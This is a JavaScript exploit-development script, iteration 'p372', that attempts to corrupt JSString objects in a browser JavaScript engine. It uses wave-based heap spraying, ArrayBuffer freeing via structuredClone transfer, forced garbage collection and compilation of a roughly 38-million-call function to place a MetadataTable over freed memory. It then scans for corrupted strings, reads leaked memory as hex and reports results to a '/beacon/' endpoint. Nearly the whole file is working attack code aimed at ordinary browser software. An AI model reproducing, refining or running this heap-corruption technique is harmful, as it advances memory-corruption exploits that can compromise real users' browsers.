// p372 - MetadataTable JSString corruption with wave-based spray
//
// p370/p371b failed: dense spray puts all objects at same address range,
// all below MetadataTable. p146/p148 worked because program strings were
// scattered across different MarkedSpace blocks at various addresses.
//
// Strategy: spray strings in WAVES separated by large allocations.
// Each wave pushes MarkedSpace to request new blocks at higher addresses.
// Large allocations between waves consume marge pages, potentially
// pushing the MetadataTable allocation into a previously-used marge page
// at a LOWER address relative to later string waves.
//
// Wave 0: 2000 strings, then 20x 1MB buffers
// Wave 1: 2000 strings, then 20x 1MB buffers
// Wave 2: 2000 strings, then 20x 1MB buffers
// Wave 3: 2000 strings, then 20x 1MB buffers
// Wave 4: 2000 strings (final, highest addresses)
// Free ALL buffers from all waves
// GC
// Compile 38M function -> MetadataTable fills freed marge hole
// Scan all 10000 strings across all waves
//
// Beacon prefix: V372-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V372-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V372-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var WAVES = 5;
  var PER_WAVE = 2000;
  var BUFS_PER_WAVE = 20;
  var BUF_SIZE = 1048576; // 1MB per buffer to consume marge pages
  var TOTAL = WAVES * PER_WAVE;

  var strings = new Array(TOTAL);
  var buffers = [];
  var strOK = 0;

  // Create strings in waves with large buffer allocations between
  for (var w = 0; w < WAVES; w++) {
    var base = w * PER_WAVE;
    for (var i = 0; i < PER_WAVE; i++) {
      try {
        var idx = ('00000' + (base + i)).slice(-5);
        strings[base + i] = idx + idx + idx + idx + idx + idx + '@@';
        strOK++;
      } catch(e) { break; }
    }

    // Push allocator forward with large buffers (except after last wave)
    if (w < WAVES - 1) {
      for (var b = 0; b < BUFS_PER_WAVE; b++) {
        try {
          buffers.push(new ArrayBuffer(BUF_SIZE));
        } catch(e) { break; }
      }
    }
  }

  B('STRINGS-' + strOK + '-BUFS-' + buffers.length);

  // Resolve ALL strings (forces m_value -> StringImpl)
  var actualLen = strings[0] ? strings[0].length : 0;
  var canaries = new Uint8Array(TOTAL);
  for (var i = 0; i < TOTAL; i++) {
    if (!strings[i]) continue;
    try {
      var L = strings[i].length;
      canaries[i] = strings[i].charCodeAt(0);
    } catch(e) {}
  }
  B('RESOLVED-len' + actualLen);

  // Free ALL large buffers to create marge holes
  var freed = 0;
  for (var i = 0; i < buffers.length; i++) {
    try {
      structuredClone(buffers[i], {transfer: [buffers[i]]});
      freed++;
    } catch(e) {}
    buffers[i] = null;
  }
  buffers = null;
  B('FREED-' + freed);

  // GC pressure
  var gcP = [];
  for (var i = 0; i < 60; i++) gcP.push(new ArrayBuffer(65536));
  gcP = null;
  for (var i = 0; i < 30000; i++) var _gc = {a: i, b: [i]};

  setTimeout(function() {
    // Second GC round
    var gcP2 = [];
    for (var i = 0; i < 60; i++) gcP2.push(new ArrayBuffer(65536));
    gcP2 = null;
    for (var i = 0; i < 30000; i++) var _gc2 = {a: i};
    B('GC-DONE');

    // Compile 38M function
    var N = 38348816;
    var CHUNK = 4000000;
    var nChunks = Math.floor(N / CHUNK);
    var rem = N - nChunks * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(nChunks + 3);
    parts[0] = 'window.__p372fn=function(a){';
    for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
    parts[nChunks + 1] = 'a();'.repeat(rem);
    parts[nChunks + 2] = '};window.__p372scan();';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    window.__p372scan = function() {
      B('COMPILED-OK');

      // Scan ALL strings per wave
      var waveHits = new Array(WAVES);
      for (var w = 0; w < WAVES; w++) waveHits[w] = 0;

      var totalLen = 0;
      var totalChar = 0;
      var totalCrash = 0;
      var leaks = [];

      for (var i = 0; i < TOTAL; i++) {
        if (!strings[i]) continue;
        var wave = Math.floor(i / PER_WAVE);
        try {
          var newLen = strings[i].length;
          var newC0 = strings[i].charCodeAt(0);

          var lenChanged = (newLen !== actualLen);
          var charChanged = (newC0 !== canaries[i]);

          if (!lenChanged && !charChanged) continue;

          waveHits[wave]++;

          if (lenChanged) {
            totalLen++;
            if (totalLen <= 3) B('LENHIT-W' + wave + '-I' + i + '-' + newLen);
          }
          if (charChanged) {
            totalChar++;
            if (totalChar <= 3) B('CHARHIT-W' + wave + '-I' + i + '-was' + canaries[i] + '-now' + newC0);
          }

          if (leaks.length >= 4) continue;

          // Read corrupted string content
          var hex = '';
          var readOK = 0;
          try {
            var readN = Math.min(newLen > 0 && newLen < 10000 ? newLen : 64, 64);
            for (var j = 0; j < readN; j++) {
              var cc = strings[i].charCodeAt(j);
              hex += hexByte(cc & 0xFF);
              if (cc > 255) hex += hexByte((cc >> 8) & 0xFF);
              readOK++;
            }
          } catch(e) { hex += '-CRASH'; }

          leaks.push(1);
          B('LEAK-W' + wave + '-I' + i + '-len' + newLen + '-read' + readOK);
          B('LDATA-' + hex.substring(0, 200));

          if (newLen !== actualLen && newLen > 0) {
            B('NEWLEN-' + newLen + '-hex' + newLen.toString(16));
          }

        } catch(e) {
          totalCrash++;
          waveHits[wave]++;
          if (totalCrash <= 3) B('CRASH-W' + wave + '-I' + i + '-' + String(e).substring(0, 30));
        }
      }

      // Report per-wave hit counts
      var waveSummary = '';
      for (var w = 0; w < WAVES; w++) waveSummary += 'W' + w + ':' + waveHits[w] + ' ';
      B('WAVES-' + waveSummary.trim());
      B('RESULT-L' + totalLen + '-C' + totalChar + '-X' + totalCrash);

      if (totalLen === 0 && totalChar === 0 && totalCrash === 0) {
        B('NOCORRUPT');
      }

      B('DONE');
    };

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;

    setTimeout(function() {
      if (!window.__p372fn) B('TIMEOUT-NO-COMPILE');
    }, 120000);
  }, 3000);
})();
